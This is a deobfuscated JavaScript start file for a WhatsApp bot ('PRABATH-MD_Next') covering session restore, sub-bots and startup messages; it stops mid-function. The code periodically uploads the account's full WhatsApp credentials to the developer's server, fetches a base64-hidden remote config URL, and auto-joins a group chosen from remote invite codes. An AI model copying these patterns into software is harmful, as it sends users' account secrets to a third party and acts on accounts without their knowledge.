// Fully identifier-cleaned version of start.cleaned.js
// Obfuscator helper/array wrappers were removed in the previous pass.
// All remaining _0x... identifiers have been replaced with stable readable identifiers.

// Deobfuscated/cleaned from start.js
// Removed: string-array decoder, array rotation, anti-debugger/self-defending wrappers, and unused decoder helpers.
// Runtime/application logic is otherwise preserved as-is.

import esmLib from './lib/esm.js';
import http from 'http';
import pm2Manager from './lib/pm2Manager.js';
import fetch from 'node-fetch';
import axios from 'axios';
import 'child_process';
import configV2 from './config-v2.js';
import { getBuffer, sleep, fetchJson, pmdStore } from './lib/functions.js';
import fs from 'fs';
import { Boom } from '@hapi/boom';
import GRL from './lib/GRL.js';
import configEnv from './config-env.js';
import pino from 'pino';
import path from 'path';
import { fileURLToPath } from 'url';
import 'util';
import { sms } from './lib/msg.js';
import 'cheerio';
import { githubSearchFile, githubDeleteFile, githubClearAndWriteFile, getGroupSetting, getAllSubBots, deleteSubBot } from './lib/github-functions.js';
import crypto from 'crypto';
import 'megajs';
const {
  makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  fetchLatestBaileysVersion,
  getContentType,
  Browsers,
  getAggregateVotesInPollMessage,
  makeCacheableSignalKeyStore,
  receivedPendingNotifications,
  generateWAMessageFromContent,
  generateForwardMessageContent,
  downloadContentFromMessage,
  prepareWAMessageMedia,
  proto,
  fetchLatestWaWebVersion
} = await import("@whiskeysockets/baileys");
import NodeCache from 'node-cache';
import * as commands from './command.js';
import { fixConfig } from './lib/check.js';
const l = console.log;
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
global.runningBots = new Map();
function detectDbType(decoded_001) {
  if (!decoded_001) {
    return "mongodb";
  }
  const decoded_002 = decoded_001.toLowerCase();
  if (decoded_002.startsWith("ghp_")) {
    return "github";
  }
  if (decoded_002.startsWith("mongo_") || decoded_002.includes("mongodb")) {
    return "mongodb";
  }
  if (decoded_002.startsWith("pg_") || decoded_002.includes("postgres") || decoded_002.includes("supabase")) {
    return "postgresql";
  }
  if (decoded_002.startsWith("mysql_") || decoded_002.includes("mysql")) {
    return "mysql";
  }
  if (decoded_002.startsWith("sqlite_") || decoded_002.includes("sqlite")) {
    return "sqlite";
  }
  return "mongodb";
}
function isBadWord(decoded_003, decoded_004) {
  if (!decoded_003 || !decoded_004 || !Array.isArray(decoded_004)) {
    return false;
  }
  const decoded_005 = decoded_003.toLowerCase();
  for (const decoded_006 of decoded_004) {
    const decoded_007 = decoded_006.trim().toLowerCase();
    if (!decoded_007) {
      continue;
    }
    if (/[\u0D80-\u0DFF]/.test(decoded_007)) {
      if (decoded_005.includes(decoded_007)) {
        return true;
      }
    } else {
      try {
        const decoded_008 = decoded_007.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
        const decoded_009 = new RegExp("\\b" + decoded_008 + "\\b", 'i');
        if (decoded_009.test(decoded_005)) {
          return true;
        }
      } catch (decoded_010) {
        if (decoded_005.includes(decoded_007)) {
          return true;
        }
      }
    }
  }
  return false;
}
async function startprabathmd() {
  console.log("🚀 Starting Main Bot...");
  await connectToWA(null);
  const {
    ROD: decoded_011
  } = await import("./lib/readOwnerData.js");
  const decoded_012 = decoded_013 => {
    try {
      const decoded_014 = Buffer.from(decoded_013, "base64").toString("utf-8");
      const decoded_015 = decoded_014.split(':');
      if (decoded_015.length < 3) {
        return true;
      }
      const decoded_016 = new Date(decoded_015[1]);
      const decoded_017 = parseInt(decoded_015[2]);
      const decoded_018 = new Date(decoded_016);
      decoded_018.setDate(decoded_018.getDate() + decoded_017);
      return decoded_018 < new Date();
    } catch {
      return true;
    }
  };
  if (decoded_011.isSubBotActive === "true") {
    setTimeout(async () => {
      console.log("🔄 Loading Sub-Bots from Database...");
      try {
        const decoded_019 = await getAllSubBots();
        if (decoded_019 && decoded_019.length > 0) {
          console.log("🔎 Found " + decoded_019.length + " Sub-Bots.");
          for (const decoded_020 of decoded_019) {
            if (decoded_020.is_active) {
              if (decoded_011.isSubBotPremium === "true") {
                const decoded_021 = decoded_011.isSubBotPremiumUsers || '';
                const decoded_022 = decoded_021.split(',');
                const decoded_023 = decoded_020.botNumber.split('').reverse().join('');
                const decoded_024 = decoded_022.find(decoded_025 => {
                  try {
                    return Buffer.from(decoded_025.trim(), "base64").toString("utf-8").startsWith(decoded_023);
                  } catch {
                    return false;
                  }
                });
                if (!decoded_024 || decoded_012(decoded_024)) {
                  console.log("🚫 Skipping Sub-Bot " + decoded_020.botNumber + ": Premium Expired or Not Found.");
                  continue;
                }
              }
              console.log("⏳ Starting Sub-Bot: " + decoded_020.botNumber + "...");
              await sleep(2000);
              const decoded_026 = {
                phoneNumber: decoded_020.botNumber,
                sessionId: decoded_020.sessionId
              };
              connectToWA(decoded_026);
            }
          }
        }
      } catch (decoded_027) {
        console.error("❌ Error loading sub-bots:", decoded_027);
      }
    }, 5000);
  } else {
    console.log("⚠️ Sub-Bot Feature is DISABLED by Developer. Skipping...");
  }
  const decoded_028 = process.env.PORT || 8000;
  const decoded_029 = http.createServer((decoded_030, decoded_031) => {
    const decoded_032 = {
      "Content-Type": "text/html"
    };
    decoded_031.writeHead(200, decoded_032);
    const decoded_033 = "\n            <!DOCTYPE html>\n            <html>\n            <head>\n                <title>PRABATH-MD_Next Status</title>\n                <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n                <style>\n                    body { font-family: Arial, sans-serif; background-color: #101010; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }\n                    .card { background: #1e1e1e; padding: 30px; border-radius: 15px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5); max-width: 300px; width: 90%; }\n                    h1 { color: #25D366; margin-bottom: 10px; font-size: 22px; }\n                    p { color: #aaa; font-size: 14px; margin-bottom: 25px; }\n                    .btn { display: inline-block; padding: 12px 25px; background-color: #3b82f6; color: white; text-decoration: none; border-radius: 8px; font-weight: bold; transition: 0.3s; }\n                    .btn:hover { background-color: #2563eb; }\n                </style>\n            </head>\n            <body>\n                <div class=\"card\">\n                    <h1>Bot Running</h1>\n                    <p>PRABATH-MD_Next is Online.</p>\n                    <p>Active Sessions: " + (global.runningBots ? global.runningBots.size : 1) + "</p>\n                    <a href=\"https://md.prabath.top\" class=\"btn\">Manage / More Details &rarr;</a>\n                </div>\n            </body>\n            </html>\n        ";
    decoded_031.end(decoded_033);
  });
  decoded_029.listen(decoded_028, () => {});
}
async function connectToWA(decoded_034 = null) {
  let decoded_035;
  let decoded_036 = !!decoded_034;
  let decoded_037 = decoded_036 ? decoded_034.phoneNumber : configEnv.BOT_NUMBER || process.env.BOT_NUMBER;
  let decoded_038 = decoded_036 ? decoded_034.sessionId : configEnv.SESSION_ID || process.env.SESSION_ID;
  const decoded_039 = decoded_040 => {
    if (!decoded_036) {
      console.log(decoded_040);
    }
  };
  let decoded_041 = decoded_036 ? "auth_sessions/" + decoded_037 : process.env.AUTH_PATH || "auth_info_baileys";
  async function decoded_042(decoded_043) {
    console.log("⚠️ Subbot (" + decoded_037 + ") failed: " + decoded_043 + ". Deleting...");
    try {
      await deleteSubBot(decoded_037);
      global.runningBots["delete"](decoded_037);
      const decoded_044 = path.join(__dirname, "auth_sessions/" + decoded_037);
      if (fs.existsSync(decoded_044)) {
        const decoded_045 = {
          recursive: true,
          force: true
        };
        fs.rmSync(decoded_044, decoded_045);
      }
      const decoded_046 = process.env.BOT_NUMBER;
      const decoded_047 = global.runningBots.get(decoded_046);
      if (decoded_047) {
        const decoded_048 = decoded_046 + "@s.whatsapp.net";
        const decoded_049 = "⚠️ *SUB-BOT ALERT (DELETED)* ⚠️\n\n🤖 *Bot Number:* `" + decoded_037 + "`\n🚫 *Reason:* " + decoded_043 + "\n\n_This sub-bot has been automatically stopped and deleted from the database to prevent main server crashes. The user needs to pair again._";
        const decoded_050 = {
          text: decoded_049
        };
        await decoded_047.sendMessage(decoded_048, decoded_050);
      }
    } catch (decoded_051) {
      console.error("❌ Error in subbot cleanup:", decoded_051);
    }
  }
  var decoded_052;
  const decoded_053 = process.env.GITHUB_AUTH_TOKEN || process.env.DB || process.env.DATABASE || process.env.DB_URL || process.env.MONGODB || process.env.MYSQL || process.env.POSTGRESQL;
  if (decoded_053) {
    decoded_052 = decoded_053;
  } else {
    decoded_052 = configV2.GITHUB_AUTH_TOKEN;
  }
  let decoded_054 = await GRL();
  var decoded_055;
  let decoded_056;
  if (!decoded_052) {
    return console.log("❌ Please set your database environment variable. (DB)");
  }
  let decoded_057 = path.join(__dirname, decoded_041);
  const decoded_058 = path.join(decoded_057, "creds.json");
  if (!fs.existsSync(decoded_057)) {
    const decoded_059 = {
      recursive: true
    };
    fs.mkdirSync(decoded_057, decoded_059);
  }
  if (!fs.existsSync(path.join(decoded_057, "creds.json"))) {
    if (!decoded_038) {
      return console.log("❗ SESSION_ID not found get it - md.prabath.top/pair");
    }
    const decoded_060 = await import("crypto");
    const decoded_061 = decoded_062 => {
      try {
        return Buffer.from(decoded_062, "base64").toString("utf-8").split('').reverse().join('');
      } catch {
        return null;
      }
    };
    const decoded_063 = (decoded_064, decoded_065) => {
      try {
        const {
          iv: decoded_066,
          tag: decoded_067,
          d1: decoded_068
        } = decoded_064;
        if (!decoded_068) {
          return null;
        }
        const decoded_069 = decoded_060.scryptSync(decoded_065.trim(), "PRABATH-MD-SESSION-SALT", 32);
        const decoded_070 = decoded_060.createDecipheriv("aes-256-gcm", decoded_069, Buffer.from(decoded_066, "hex"));
        decoded_070.setAuthTag(Buffer.from(decoded_067, "hex"));
        let decoded_071 = decoded_070.update(decoded_068, "hex", "utf8");
        decoded_071 += decoded_070.final("utf8");
        return JSON.parse(decoded_071);
      } catch {
        return null;
      }
    };
    try {
      if (decoded_038.startsWith("PRABATH-MD~")) {
        const decoded_072 = decoded_038.replace("PRABATH-MD~", '').trim();
        const decoded_073 = "https://pmd-session-store.koyeb.app/download/" + decoded_072;
        const decoded_074 = await fetch(decoded_073);
        if (!decoded_074.ok) {
          throw new Error("Failed to fetch session from pmd session store");
        }
        const decoded_075 = Buffer.from(await decoded_074.arrayBuffer()).toString("utf-8");
        let decoded_076;
        try {
          const decoded_077 = JSON.parse(decoded_075);
          if (decoded_077._x_sid && decoded_077.data) {
            const decoded_078 = decoded_061(decoded_077._x_sid);
            if (decoded_078) {
              const decoded_079 = decoded_063(decoded_077.data, decoded_078);
              if (decoded_079) {
                decoded_076 = decoded_079;
                console.log("🔒 Secure Session Restored.");
              } else {
                throw new Error("Integrity Check Failed");
              }
            } else {
              throw new Error("Invalid Token");
            }
          } else {
            decoded_076 = decoded_077;
          }
        } catch (decoded_080) {
          try {
            decoded_076 = JSON.parse(Buffer.from(decoded_075, "base64").toString("utf-8"));
          } catch (decoded_081) {
            if (decoded_080.message.includes("Integrity")) {
              throw decoded_080;
            }
            decoded_076 = JSON.parse(decoded_075);
          }
        }
        fs.writeFileSync(path.join(decoded_057, "creds.json"), JSON.stringify(decoded_076, null, 2));
        const decoded_082 = path.join(decoded_057, "msg_store.json");
        if (fs.existsSync(decoded_082)) {
          fs.unlinkSync(decoded_082);
        }
        console.log("Session downloaded & Saved ✅");
      } else {
        console.log("❗ Invalid Session ID Format.");
      }
    } catch (decoded_083) {
      console.error("❌ Session Init Error:", decoded_083.message);
    }
  }
  await sleep(1000);
  if (decoded_058) {
    const decoded_084 = fs.readFileSync(decoded_058, "utf-8");
    const decoded_085 = JSON.parse(decoded_084);
    if (decoded_085 && decoded_085?.['me'] && decoded_085?.['me']?.['id']) {
      const decoded_086 = decoded_085.me.id.split(':')[0];
      if (decoded_086 !== decoded_037) {
        decoded_039("🔄⬆️  Updating Bot Number from Creds: " + decoded_037 + " --> " + decoded_086);
        decoded_037 = decoded_086;
        if (!decoded_036) {
          configEnv.BOT_NUMBER = decoded_086;
          process.env.BOT_NUMBER = decoded_086;
          decoded_039("🔄✔️ BOT_NUMBER auto updated from creds: " + process.env.BOT_NUMBER);
        }
      }
    } else {
      if (decoded_036) {
        await decoded_042("SESSION_ID is invalid or expired");
        return;
      }
      return console.log("⚠️ Your SESSION_ID invalid or expired! Can you check again?");
    }
  } else {
    if (decoded_036) {
      await decoded_042("creds.json file not found");
      return;
    }
    return console.log("⚠️ creds.json not found! re-pair session - md.prabath.top/pair");
  }
  async function decoded_087() {
    try {
      try {
        await fixConfig(decoded_037);
        return "configtrue";
      } catch (decoded_088) {
        console.error("Config Error:", decoded_088.message);
        return "configfalse";
      }
    } catch (decoded_089) {
      console.error("Outer Error:", decoded_089.message);
    }
  }
  let decoded_090 = false;
  const decoded_091 = new Set();
  const decoded_092 = new Set();
  const decoded_093 = {
    stdTTL: 0x12c,
    useClones: false
  };
  const decoded_094 = new NodeCache(decoded_093);
  const decoded_095 = new NodeCache();
  try {
    const decoded_096 = await decoded_087();
    if (decoded_096 === "configtrue") {
      await fixConfig(decoded_037);
      const {
        readConfig: decoded_097
      } = await import("./lib/check.js");
      const decoded_098 = await decoded_097(decoded_037);
      const decoded_099 = decoded_098.PREFIX;
      const decoded_100 = await import("./lib/create-db-ar.js");
      let decoded_101 = await decoded_100.createAndWriteFilesOnDataBase(decoded_037);
      decoded_039(decoded_101);
      const decoded_102 = (await import("./lib/updateOwnerDataFile.js"))["default"];
      const decoded_103 = Buffer.from("aHR0cHM6Ly9wbWQtYXV0by12cy1hcGkud2Vic2hhcmUzODQud29ya2Vycy5kZXYvanNvbi9kZXRhaWxzLmpzb24=", "base64");
      const decoded_104 = new TextDecoder();
      const decoded_105 = decoded_104.decode(decoded_103);
      await decoded_102(decoded_105);
      const {
        ROD: decoded_106
      } = await import("./lib/readOwnerData.js");
      if ((await detectDbType(decoded_052)) === "github") {
        if (decoded_054.rateLimit < 15) {
          console.log("⚠️ The limit of GITHUB_AUTH_TOKEN has been reached. Cannot Use PRABATH-MD for " + decoded_054.resetTime + '.');
          if (!decoded_036) {
            pm2Manager.stopBot();
          }
        }
      }
      const {
        state: decoded_107,
        saveCreds: decoded_108
      } = await useMultiFileAuthState(path.join(__dirname, decoded_041));
      const {
        version: decoded_109,
        isLatest: decoded_110
      } = await fetchLatestWaWebVersion();
      decoded_039("🧩 using WA v" + decoded_109.join('.') + ", isLatest: " + decoded_110);
      let decoded_111;
      if (decoded_098.ALWAYS_ONLINE == "true") {
        decoded_111 = true;
      } else {
        if (decoded_098.ALWAYS_ONLINE == "false") {
          decoded_111 = false;
        }
      }
      const decoded_112 = makeWASocket({
        'logger': pino({
          'level': "silent"
        }),
        'auth': {
          'creds': decoded_107.creds,
          'keys': makeCacheableSignalKeyStore(decoded_107.keys, pino({
            'level': "silent"
          }).child({
            'level': "silent"
          }))
        },
        'browser': Browsers.macOS("Chrome"),
        'cachedGroupMetadata': async decoded_113 => {
          if (!decoded_113) {
            return undefined;
          }
          return decoded_094.get(decoded_113);
        },
        'getMessage': async decoded_114 => {
          if (decoded_035) {
            const decoded_115 = await decoded_035.loadMessage(decoded_114);
            return decoded_115?.["message"] || undefined;
          }
        },
        'markOnlineOnConnect': false,
        'syncFullHistory': false,
        'msgRetryCounterCache': decoded_095,
        'version': decoded_109
      });
      global.runningBots.set(decoded_037, decoded_112);
      decoded_035 = esmLib(decoded_112);
      decoded_035.bind(decoded_112.ev);
      let decoded_116;
      decoded_112.ev.on("creds.update", async () => {
        await decoded_108();
        if (configEnv.SESSION_ID) {
          if (decoded_116) {
            clearTimeout(decoded_116);
          }
          decoded_116 = setTimeout(async () => {
            try {
              const decoded_117 = decoded_038.replace("PRABATH-MD~", '').trim();
              const decoded_118 = path.join(decoded_057, "creds.json");
              if (fs.existsSync(decoded_118)) {
                const decoded_119 = JSON.parse(fs.readFileSync(decoded_118, "utf-8"));
                if (decoded_036) {} else {
                  const decoded_120 = {
                    id: decoded_117,
                    creds: decoded_119
                  };
                  await axios.post("https://pmd-session-store.koyeb.app/update-session", decoded_120);
                }
                console.log("♻️ Session Synced for " + decoded_037 + '.');
              }
            } catch (decoded_121) {}
          }, 600000);
        }
      });
      decoded_112.ev.on("connection.update", async decoded_122 => {
        const {
          connection: decoded_123,
          lastDisconnect: decoded_124,
          qr: decoded_125
        } = decoded_122;
        if (decoded_125) {
          decoded_090 = decoded_125;
          if (true && !decoded_036) {
            console.log("Connection closed !! ❌ Please scan Qr code or pair code for authenticate with whatsapp !!");
          }
        }
        if (decoded_123 === "close") {
          global.runningBots["delete"](decoded_037);
          const decoded_126 = new Boom(decoded_124?.["error"])?.["output"]?.["statusCode"];
          console.log('[' + decoded_037 + "] Connection closed: " + decoded_126);
          switch (decoded_126) {
            case DisconnectReason.badSession:
              console.log("❌ Bad Session. Delete session file and re-authenticate.");
              if (decoded_036) {
                await decoded_042("Bad Session (WhatsApp invalidated the connection)");
              } else {
                process.exit();
              }
              break;
            case DisconnectReason.connectionClosed:
              console.log("🔁 Connection closed unexpectedly. Reconnecting...");
              connectToWA(decoded_034);
              break;
            case DisconnectReason.connectionLost:
              console.log("📡 Connection lost. Trying to reconnect...");
              connectToWA(decoded_034);
              break;
            case DisconnectReason.connectionReplaced:
              console.log("🔄 Connection replaced by a new session. Exiting current session.");
              if (decoded_036) {
                await decoded_042("Connection Replaced (Logged in from another location)");
              } else {
                process.exit();
              }
              break;
            case DisconnectReason.loggedOut:
              console.log("📴 Logged out from WhatsApp.");
              if (decoded_036) {
                await decoded_042("User Logged Out from WhatsApp");
              } else {
                const decoded_127 = configEnv.BOT_NUMBER + "@s.whatsapp.net.json";
                const decoded_128 = await githubSearchFile(decoded_127, decoded_037);
                if (decoded_128) {
                  try {
                    await githubDeleteFile(decoded_127, decoded_037);
                    console.log("🗑️ auth file deleted from database ✅");
                  } catch (decoded_129) {
                    console.error("❌ db auth file delete error:", decoded_129.message);
                  }
                }
                const decoded_130 = path.join(__dirname, decoded_041, "creds.json");
                const decoded_131 = path.join(__dirname, decoded_041, "msg_store.json");
                try {
                  if (fs.existsSync(decoded_130)) {
                    await fs.promises.unlink(decoded_130);
                  }
                  if (fs.existsSync(decoded_131)) {
                    await fs.promises.unlink(decoded_131);
                  }
                } catch (decoded_132) {
                  console.log("⚠️ Auth file delete error:", decoded_132.message);
                }
                await sleep(2000);
                pm2Manager.stopBot();
              }
              break;
            case DisconnectReason.restartRequired:
              console.log("♻️ Restart required. Restarting...");
              connectToWA(decoded_034);
              break;
            case DisconnectReason.timedOut:
              console.log("⌛ Connection timed out. Trying again...");
              connectToWA(decoded_034);
              break;
            default:
              console.log("❗ Unknown disconnect reason:", decoded_126);
              if (!decoded_036) {
                pm2Manager.stopBot();
              }
          }
        }
        if (decoded_123 === "open") {
          decoded_056 = "open";
          decoded_090 = '';
          decoded_039("🧬 VERSION: " + decoded_106.version);
          console.log('[' + decoded_037 + "] 🔄 Connecting...");
          fs.readdirSync("./plugins/").forEach(decoded_133 => {
            if (path.extname(decoded_133).toLowerCase() == ".js") {
              import("./plugins/" + decoded_133);
            }
          });
          if (decoded_106.preCache === "true" || decoded_106.preCache === true) {
            const decoded_134 = async () => {
              decoded_039("⏳ Starting to pre-cache group metadata...");
              const decoded_135 = await decoded_112.groupFetchAllParticipating();
              const decoded_136 = Object.keys(decoded_135).length;
              if (decoded_136 > 100) {
                decoded_039("⚠️ More than 100 groups (" + decoded_136 + "). Skipping pre-cache to ensure fast startup.");
                return;
              }
              let decoded_137 = 0;
              let decoded_138 = 0;
              for (const decoded_139 in decoded_135) {
                decoded_138++;
                if (!decoded_094.get(decoded_139)) {
                  try {
                    const decoded_140 = await decoded_112.groupMetadata(decoded_139);
                    decoded_094.set(decoded_139, decoded_140);
                    decoded_137++;
                  } catch (decoded_141) {}
                  if (decoded_138 % 5 === 0) {
                    await sleep(1000);
                  }
                }
              }
              decoded_039("✅ Pre-caching complete. Newly cached metadata for " + decoded_137 + " groups.");
            };
            const decoded_142 = new Promise((decoded_143, decoded_144) => setTimeout(() => decoded_144(new Error("Pre-caching timed out after 15 seconds")), 15000));
            try {
              await Promise.race([decoded_134(), decoded_142]);
            } catch (decoded_145) {
              console.warn("⚠️ " + decoded_145.message + ". Continuing bot startup.");
            }
          } else {
            decoded_039("ℹ️ Group pre-caching is disabled by Owner.");
          }
          async function decoded_146() {
            const decoded_147 = Array.from((decoded_098.SUDO || '').split(','));
            decoded_147.forEach(decoded_148 => {
              try {
                const decoded_149 = decoded_148.trim() + "@s.whatsapp.net";
                if (decoded_054.rateLimit < 28) {
                  const decoded_150 = {
                    text: "⚠️ *The limit of `GITHUB_AUTH_TOKEN` has been reached. `Cannot Use PRABATH-MD for " + decoded_054.resetTime + '`' + '.*'
                  };
                  decoded_112.sendMessage(decoded_149, decoded_150);
                  decoded_055 = "true";
                } else {
                  decoded_055 = "false";
                }
              } catch (decoded_151) {
                console.error('' + decoded_151.message);
              }
            });
          }
          if ((await detectDbType(decoded_052)) === "github") {
            decoded_146();
            if (decoded_055 == "true") {
              return;
            }
          }
          let decoded_152 = "*PRABATH-MD_Next :: Bot Started Successfully* ✅\n\n*🕺 Hello User,*\n*Welcome to your ultimate WhatsApp experience! 🚀*\n\n`PRABATH-MD_Next is now fully customizable. You can now modify the \"Bot Name\", \"Bot Footer\", \"themes/styles\", and much more to create a unique experience.` 😎\n\n\n> 🔗 *Official Resources*\n*- 📘 Info:* " + decoded_106.officialWebsite + "/infomd\n*- 📄 Terms:* " + decoded_106.officialWebsite + "/terms\n*- 💰 Plans:* " + decoded_106.officialWebsite + "/plans\n*- 🌐 Website:* " + decoded_106.officialWebsite + "\n\n*🛠️ Easy Setup:* Type *" + decoded_098.PREFIX + "setup* to configure your bot settings (bot-name, footer, settings, etc.) step-by-step! 📝 \n\n> 💡 *System & Commands*\n- *GRL:* ```" + decoded_054.rateLimit + "```\n- *To view all env vars:* *" + decoded_098.PREFIX + "myenv*\n- *To modify settings:* *" + decoded_098.PREFIX + "settings*\n- *To apply settings:* *" + decoded_098.PREFIX + "apply*\n- *To see all commands:* *" + decoded_098.PREFIX + "menu*\n- *For assistance:* *" + decoded_098.PREFIX + "help*\n\n> ⚙️ *Current Configuration*\n\n> Prefix: " + decoded_098.PREFIX + "\n> Mode: " + decoded_098.WORK_TYPE + "\n> Language: " + decoded_098.LANG + "\n> Online: " + decoded_098.ALWAYS_ONLINE + "\n> Name: " + decoded_098.BOT_NAME + "\n> Footer: " + decoded_098.BOT_FOOTER + "\n> Power: " + decoded_098.POWER + "\n> Sudo: " + decoded_098.SUDO + "\n" + "‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎" + "\n\n📢 *Ads:* " + decoded_106.extraText + "\n";
          const decoded_153 = Array.from((decoded_098.SUDO || '').split(','));
          decoded_153.forEach(decoded_154 => {
            try {
              const decoded_155 = decoded_154.trim() + "@s.whatsapp.net";
              setTimeout(() => {
                const decoded_156 = {
                  url: decoded_106.startImage
                };
                const decoded_157 = {
                  image: decoded_156,
                  caption: '' + decoded_152
                };
                decoded_112.sendMessage(decoded_155, decoded_157);
              }, 2000);
            } catch (decoded_158) {
              console.error("Error start message to " + decoded_154 + ": " + decoded_158.message);
            }
          });
          setTimeout(async () => {
            try {
              const decoded_159 = process.env.BOT_NUMBER;
              const decoded_160 = Array.from((decoded_098.SUDO || '').split(','));
              for (const decoded_161 of decoded_160) {
                const decoded_162 = decoded_161.trim() + "@s.whatsapp.net";
                if (decoded_036) {
                  const decoded_163 = "🤖 *PRABATH-MD_Next :: SUB-INSTANCE CONNECTED* ✔️\n\n👤 *Host Server:* `" + decoded_159 + "`\n\n🛡️ *Security & Database Info:*\nYour privacy is our top priority. Here is how we protect you:\n\n1. *Transit Security (E2EE):*\n   All your chats are protected by WhatsApp's official *End-to-End Encryption*.\n\n2. *Internal Protection (AES-256 GCM):*\n   This is where we go the extra mile. All your *Configurations*, *Internal Data*, and *Messages* are strictly encrypted using *AES-256 GCM*.\n\n3. *Shared Database Security:*\n   Please note that this Sub-Bot uses the Main Bot's database to store your configs. However, *all saved data is fully encrypted* with the technology above. It is 100% secure.\n   \n🔒 Even though you are hosted here and share the database, your *settings and personal data* remain locked. The host *cannot* read or access your *configs & messages.*\n\n⚙️ *Management:*\nYou can customize your bot settings anytime:\n✴ *Commands:* .settings, .apply, .themes, .remove, .gset\n\nℹ️ *More info:* md.prabath.top/subbot\n\n> PRABATH-MD_Next";
                  const decoded_164 = {
                    text: decoded_163
                  };
                  decoded_112.sendMessage(decoded_162, decoded_164);
                } else {
                  const decoded_165 = await getAllSubBots();
                  if (decoded_165 && decoded_165.length > 0) {
                    let decoded_166 = decoded_165.map((decoded_167, decoded_168) => "   " + (decoded_168 + 1) + ". " + decoded_167.botNumber).join("\n");
                    const decoded_169 = "🤖 *PRABATH-MD_Next :: INFRASTRUCTURE STATUS* ℹ️\n\n📊 *System Overview:*\n• *Active Instances:* " + decoded_165.length + "\n• *Database:* Online & Shared\n\n📜 *Connected Sub-Bots:*\n" + decoded_166 + "\n\n🛠️ *Control Panel:*\nUse these commands to manage your hosted instances:\n┌ 🆔 *.gsb* (List all bots)\n├ 🗑️ *.delsubbot <number>*\n├ 🧨 *.delallsubbot* (Delete all)\n├ 🔄 *.restartsubbot <number>*\n└ 🔁 *.restartallsubbot*\n\n⚠️ *Resource Note:*\nPlease keep in mind that all these bots share your server's resources (CPU/RAM).\n• *Latency:* Heavy usage (like large media uploads) across multiple bots might cause slight delays.\n• *Stability:* If server load gets too high, the system might auto-restart to protect itself.\n\n🔗 *Docs:* md.prabath.top/subbot\n\n> PRABATH-MD_Next";
                    const decoded_170 = {
                      text: decoded_169
                    };
                    decoded_112.sendMessage(decoded_162, decoded_170);
                  }
                }
              }
            } catch (decoded_171) {
              console.log("❌ Error sending sub-bot report:", decoded_171);
            }
          }, 6000);
          fs.writeFileSync(decoded_057 + "/downloading_status.txt", "false");
          function decoded_172(decoded_173, decoded_174) {
            setTimeout(async () => {
              const decoded_175 = decoded_174.split(',');
              let decoded_176 = false;
              for (let decoded_177 = 0; decoded_177 < decoded_175.length; decoded_177++) {
                const decoded_178 = decoded_175[decoded_177].trim();
                if (decoded_173.includes(decoded_178)) {
                  decoded_176 = true;
                  break;
                }
              }
              if (decoded_176) {} else {
                const {
                  ROD: decoded_179
                } = await import("./lib/readOwnerData.js");
                const decoded_180 = decoded_179.isSGUrl;
                const decoded_181 = decoded_180.split(',');
                function decoded_182() {
                  const decoded_183 = Math.floor(Math.random() * decoded_181.length);
                  return decoded_181[decoded_183];
                }
                const decoded_184 = decoded_182();
                let decoded_185 = atob(decoded_184);
                try {
                  await decoded_112.groupAcceptInvite('' + decoded_185);
                  console.log('[' + decoded_037 + "] Successfully joined the support group. ✅");
                } catch (decoded_186) {
                  console.log('[' + decoded_037 + "] ⚠️ Failed to join support group. Reason: " + (decoded_186.message || "account_reachout_restricted") + ". Skipping...");
                }
              }
              console.log('[' + decoded_037 + "] Connected ✅");
            }, 6000);
          }
          async function decoded_187() {
            const {
              ROD: decoded_188
            } = await import("./lib/readOwnerData.js");
            let decoded_189 = await decoded_112.groupFetchAllParticipating();
            const decoded_190 = JSON.stringify(decoded_189, null, 2);
            await decoded_172(decoded_190, decoded_188.SupportGroupJid);
          }
          decoded_187();
          async function decoded_191() {
            try {
